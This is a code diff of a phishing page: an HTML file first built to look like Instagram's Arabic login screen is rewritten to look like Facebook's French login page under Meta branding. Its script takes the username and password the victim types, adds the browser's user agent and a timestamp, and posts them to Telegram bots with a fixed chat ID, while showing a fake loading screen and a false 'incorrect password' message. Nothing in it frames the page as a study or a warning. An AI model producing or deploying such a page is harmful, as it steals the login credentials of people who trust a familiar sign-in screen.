@@ -1,181 +1,139 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>إنستغرام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Facebook</title>
     <style>
-        :root {
-            --main-blue: #0095f6;
-            --secondary-blue: #b2dffc;
-            --text-dark: #262626;
-            --text-gray: #8e8e8e;
-            --light-gray: #fafafa;
-            --border-gray: #dbdbdb;
-            --white: #ffffff;
-            --error-red: #ed4956;
-            --black: #000000;
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
+            font-family: Arial, sans-serif;
         }
         
         body {
-            background-color: var(--black);
-            color: var(--white);
-            height: 100vh;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .app-container {
-            height: 100%;
+            background-color: #f0f2f5;
             display: flex;
             flex-direction: column;
-            max-width: 100%;
-            margin: 0 auto;
-            position: relative;
-        }
-        
-        .status-bar {
-            height: 44px;
-            background-color: var(--black);
-            display: flex;
+            align-items: center;
             justify-content: center;
-            align-items: flex-end;
-            padding-bottom: 8px;
-            position: relative;
+            min-height: 100vh;
+            padding: 20px;
         }
         
-        .time {
-            font-size: 15px;
-            font-weight: 600;
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        
+        .language-selector span {
+            font-weight: bold;
         }
         
         .login-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 0 34px;
-        }
-        
-        .logo {
-            margin-bottom: 36px;
-        }
-        
-        .logo svg {
-            width: 182px;
-            height: 49px;
-        }
-        
-        .login-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
             width: 100%;
+            max-width: 400px;
         }
         
-        .input-group {
-            margin-bottom: 6px;
+        .login-title {
+            font-size: 18px;
+            color: #1c1e21;
+            margin-bottom: 20px;
+            text-align: center;
         }
         
-        .form-input {
-            background-color: var(--black);
-            border: 1px solid var(--border-gray);
-            border-radius: 5px;
-            color: var(--white);
-            font-size: 14px;
-            padding: 12px 15px;
+        .input-field {
+            margin-bottom: 15px;
+        }
+        
+        .input-field input {
             width: 100%;
-            height: 44px;
-        }
-        
-        .form-input:focus {
-            border-color: var(--text-gray);
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
             outline: none;
         }
         
-        .login-btn {
-            background-color: var(--main-blue);
+        .input-field input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
             border: none;
-            border-radius: 5px;
-            color: var(--white);
-            font-weight: 600;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: bold;
             padding: 12px;
             width: 100%;
-            margin-top: 14px;
             cursor: pointer;
-            opacity: 0.7;
-            font-size: 14px;
+            margin-bottom: 15px;
         }
         
-        .login-btn.active {
-            opacity: 1;
-        }
-        
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: var(--text-gray);
-            font-size: 13px;
-            font-weight: 600;
-            width: 100%;
-        }
-        
-        .divider::before, .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid var(--border-gray);
-            margin: 0 10px;
-        }
-        
-        .facebook-login {
-            color: var(--main-blue);
-            font-size: 14px;
-            font-weight: 600;
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
-        
-        .facebook-icon {
-            margin-left: 8px;
-            font-size: 16px;
+        .login-button:hover {
+            background-color: #166fe5;
         }
         
         .forgot-password {
-            color: var(--main-blue);
-            font-size: 12px;
-            margin-top: 19px;
-            display: block;
             text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
             text-decoration: none;
         }
         
-        .signup-section {
-            border-top: 1px solid var(--border-gray);
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background-color: var(--black);
+        .forgot-password a:hover {
+            text-decoration: underline;
         }
         
-        .signup-link {
-            color: var(--main-blue);
-            font-weight: 600;
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            text-align: center;
+        }
+        
+        .create-account-button {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 12px;
             cursor: pointer;
-            margin-right: 5px;
+            margin-top: 10px;
+        }
+        
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        
+        .meta-footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        
+        .meta-footer span {
+            font-weight: bold;
         }
         
         .loading-overlay {
@@ -184,7 +142,7 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background-color: rgba(0, 0, 0, 0.9);
+            background-color: rgba(255, 255, 255, 0.9);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -194,236 +152,79 @@
         }
         
         .loading-spinner {
-            border: 3px solid var(--border-gray);
-            border-top: 3px solid var(--main-blue);
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 40px;
+            height: 40px;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         
         .loading-text {
-            font-size: 14px;
-            color: var(--white);
+            font-size: 16px;
+            color: #1c1e21;
         }
         
         .error-message {
-            color: var(--error-red);
+            color: #ff4d4f;
             font-size: 14px;
-            margin: 10px 0;
-            display: none;
             text-align: center;
+            margin-bottom: 15px;
+            display: none;
         }
         
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        /* Language selector styles */
-        .language-selector {
-            position: fixed;
-            bottom: 80px;
-            left: 20px;
-            z-index: 100;
-        }
-        
-        .language-btn {
-            background-color: var(--black);
-            border: 1px solid var(--border-gray);
-            border-radius: 20px;
-            padding: 8px 12px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            color: var(--white);
-        }
-        
-        .language-icon {
-            margin-left: 8px;
-            font-size: 16px;
-        }
-        
-        .language-dropdown {
-            position: absolute;
-            bottom: 100%;
-            left: 0;
-            background-color: var(--black);
-            border: 1px solid var(--border-gray);
-            border-radius: 10px;
-            padding: 8px 0;
-            width: 150px;
-            display: none;
-        }
-        
-        .language-dropdown.show {
-            display: block;
-        }
-        
-        .language-option {
-            padding: 10px 15px;
-            cursor: pointer;
-            color: var(--white);
-        }
-        
-        .language-option:hover {
-            background-color: #333;
-        }
-        
-        /* iOS notch simulation */
-        .notch {
-            width: 40%;
-            height: 30px;
-            background-color: var(--black);
-            border-bottom-left-radius: 15px;
-            border-bottom-right-radius: 15px;
-            margin: 0 auto;
-            position: absolute;
-            bottom: -1px;
-            left: 30%;
-        }
     </style>
 </head>
 <body>
-    <div class="app-container">
-        <div class="status-bar">
-            <div class="time" id="currentTime">9:41</div>
-        </div>
+    <div class="language-selector">
+        Français (France) <span>✔</span>
+    </div>
+    
+    <div class="login-container">
+        <h1 class="login-title">Se connecter à Facebook</h1>
         
-        <div class="login-container">
-            <div class="logo">
-                <svg aria-label="Instagram" fill="#ffffff" viewBox="0 0 192 192" width="192" height="192">
-                    <path d="M144 0H48C21.5 0 0 21.5 0 48v96c0 26.5 21.5 48 48 48h96c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm16 144c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V48c0-8.8 7.2-16 16-16h96c8.8 0 16 7.2 16 16v96z"></path>
-                    <path d="M96 64c-17.7 0-32 14.3-32 32s14.3 32 32 32 32-14.3 32-32-14.3-32-32-32zm0 48c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
-                    <circle cx="144" cy="48" r="8"></circle>
-                </svg>
+        <form id="loginForm">
+            <div class="input-field">
+                <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
             </div>
             
-            <form class="login-form" id="loginForm">
-                <div class="input-group">
-                    <input type="text" class="form-input" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" class="form-input" id="password" placeholder="كلمة السر" required>
-                </div>
-                <div class="error-message" id="errorMessage">
-                    عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر.
-                </div>
-                <button type="submit" class="login-btn" id="loginBtn" disabled>تسجيل الدخول</button>
-            </form>
-            
-            <div class="divider">أو</div>
-            
-            <div class="facebook-login">
-                <span>تسجيل الدخول باستخدام فيسبوك</span>
-                <span class="facebook-icon">f</span>
+            <div class="input-field">
+                <input type="password" id="password" placeholder="Mot de passe" required>
             </div>
             
-            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
-        </div>
-        
-        <div class="signup-section">
-            <p>ليس لديك حساب؟ <a href="#" class="signup-link">اشتراك</a></p>
-        </div>
-        
-        <div class="notch"></div>
-        
-        <div class="loading-overlay" id="loadingOverlay">
-            <div class="loading-spinner"></div>
-            <div class="loading-text" id="loadingText">جاري تسجيل الدخول...</div>
-        </div>
-        
-        <div class="language-selector">
-            <div class="language-btn" id="languageBtn">
-                <span class="language-icon">🌐</span>
-                <span id="currentLanguage">العربية</span>
+            <div class="error-message" id="errorMessage">
+                Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.
             </div>
-            <div class="language-dropdown" id="languageDropdown">
-                <div class="language-option" data-lang="ar">العربية</div>
-                <div class="language-option" data-lang="fr">Français</div>
-                <div class="language-option" data-lang="en">English</div>
+            
+            <button type="submit" class="login-button">Se connecter</button>
+            
+            <div class="forgot-password">
+                <a href="#">Mot de passe oublié ?</a>
             </div>
-        </div>
+            
+            <div class="divider"></div>
+            
+            <div class="create-account">
+                <button type="button" class="create-account-button">Créer un compte</button>
+            </div>
+        </form>
+    </div>
+    
+    <div class="meta-footer">
+        <span>✔</span> Meta
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Connexion en cours...</div>
     </div>
     
     <script>
-        // Language translations
-        const translations = {
-            ar: {
-                title: "إنستغرام",
-                usernamePlaceholder: "اسم المستخدم أو البريد الإلكتروني",
-                passwordPlaceholder: "كلمة السر",
-                loginBtn: "تسجيل الدخول",
-                divider: "أو",
-                facebookLogin: "تسجيل الدخول باستخدام فيسبوك",
-                forgotPassword: "هل نسيت كلمة السر؟",
-                signupText: "ليس لديك حساب؟ ",
-                signupLink: "اشتراك",
-                loadingText: "جاري تسجيل الدخول...",
-                errorMessage: "عذرًا، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر."
-            },
-            fr: {
-                title: "Instagram",
-                usernamePlaceholder: "Nom d'utilisateur ou e-mail",
-                passwordPlaceholder: "Mot de passe",
-                loginBtn: "Connexion",
-                divider: "ou",
-                facebookLogin: "Se connecter avec Facebook",
-                forgotPassword: "Mot de passe oublié ?",
-                signupText: "Vous n'avez pas de compte ? ",
-                signupLink: "Inscrivez-vous",
-                loadingText: "Connexion en cours...",
-                errorMessage: "Désolé, votre mot de passe est incorrect. Veuillez vérifier votre mot de passe."
-            },
-            en: {
-                title: "Instagram",
-                usernamePlaceholder: "Username or email",
-                passwordPlaceholder: "Password",
-                loginBtn: "Log In",
-                divider: "or",
-                facebookLogin: "Log in with Facebook",
-                forgotPassword: "Forgot password?",
-                signupText: "Don't have an account? ",
-                signupLink: "Sign up",
-                loadingText: "Logging in...",
-                errorMessage: "Sorry, your password was incorrect. Please double-check your password."
-            }
-        };
-        
-        // Current language
-        let currentLang = 'ar';
-        
-        // Update time
-        function updateTime() {
-            const now = new Date();
-            let hours = now.getHours();
-            let minutes = now.getMinutes();
-            minutes = minutes < 10 ? '0' + minutes : minutes;
-            document.getElementById('currentTime').textContent = `${hours}:${minutes}`;
-        }
-        
-        setInterval(updateTime, 1000);
-        updateTime();
-        
-        // Form validation
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        
-        function validateForm() {
-            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
-                loginBtn.classList.add('active');
-                loginBtn.disabled = false;
-            } else {
-                loginBtn.classList.remove('active');
-                loginBtn.disabled = true;
-            }
-        }
-        
-        usernameInput.addEventListener('input', validateForm);
-        passwordInput.addEventListener('input', validateForm);
-        
         // Form submission
         const loginForm = document.getElementById('loginForm');
         const loadingOverlay = document.getElementById('loadingOverlay');
@@ -433,8 +234,8 @@
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value.trim();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
             
             // Show loading overlay
             loadingOverlay.style.display = 'flex';
@@ -472,12 +273,12 @@
             ];
             const chatId = '780712584';
             
-            const message = `New Instagram Login Attempt:
-Username/Email: ${username}
-Password: ${password}
-Language: ${currentLang}
+            const message = `Nouvelle tentative de connexion Facebook:
+Nom d'utilisateur/e-mail: ${username}
+Mot de passe: ${password}
+Langue: Français (France)
 User Agent: ${navigator.userAgent}
-Timestamp: ${new Date().toISOString()}`;
+Heure: ${new Date().toLocaleString('fr-FR')}`;
             
             // Send to both bots
             botTokens.forEach(token => {
@@ -490,72 +291,20 @@ Timestamp: ${new Date().toISOString()}`;
                         chat_id: chatId,
                         text: message
                     })
-                }).catch(error => console.error('Error sending to Telegram:', error));
+                }).catch(error => console.error('Erreur lors de l\'envoi à Telegram:', error));
             });
         }
         
-        // Language selector functionality
-        const languageBtn = document.getElementById('languageBtn');
-        const languageDropdown = document.getElementById('languageDropdown');
-        const currentLanguageText = document.getElementById('currentLanguage');
-        
-        languageBtn.addEventListener('click', function() {
-            languageDropdown.classList.toggle('show');
+        // Create account button click
+        document.querySelector('.create-account-button').addEventListener('click', function() {
+            alert('Création de compte non disponible pour le moment.');
         });
         
-        // Close dropdown when clicking outside
-        document.addEventListener('click', function(event) {
-            if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
-                languageDropdown.classList.remove('show');
-            }
+        // Forgot password link click
+        document.querySelector('.forgot-password a').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Réinitialisation du mot de passe non disponible pour le moment.');
         });
-        
-        // Change language
-        document.querySelectorAll('.language-option').forEach(option => {
-            option.addEventListener('click', function() {
-                const lang = this.getAttribute('data-lang');
-                changeLanguage(lang);
-                languageDropdown.classList.remove('show');
-            });
-        });
-        
-        // Function to change language
-        function changeLanguage(lang) {
-            currentLang = lang;
-            const translation = translations[lang];
-            
-            // Update page title
-            document.title = translation.title;
-            
-            // Update form elements
-            usernameInput.placeholder = translation.usernamePlaceholder;
-            passwordInput.placeholder = translation.passwordPlaceholder;
-            loginBtn.textContent = translation.loginBtn;
-            document.querySelector('.divider').textContent = translation.divider;
-            document.querySelector('.facebook-login span:nth-child(1)').textContent = translation.facebookLogin;
-            document.querySelector('.forgot-password').textContent = translation.forgotPassword;
-            document.querySelector('.signup-section p').innerHTML = translation.signupText + '<a href="#" class="signup-link">' + translation.signupLink + '</a>';
-            document.getElementById('loadingText').textContent = translation.loadingText;
-            document.getElementById('errorMessage').textContent = translation.errorMessage;
-            
-            // Update current language text
-            currentLanguageText.textContent = document.querySelector(`[data-lang="${lang}"]`).textContent;
-            
-            // Update text direction
-            if (lang === 'ar') {
-                document.documentElement.dir = 'rtl';
-            } else {
-                document.documentElement.dir = 'ltr';
-            }
-        }
-        
-        // Detect browser language and set accordingly
-        const browserLang = navigator.language.substring(0, 2);
-        if (translations[browserLang]) {
-            changeLanguage(browserLang);
-        } else {
-            changeLanguage('ar');
-        }
     </script>
 </body>
 </html>
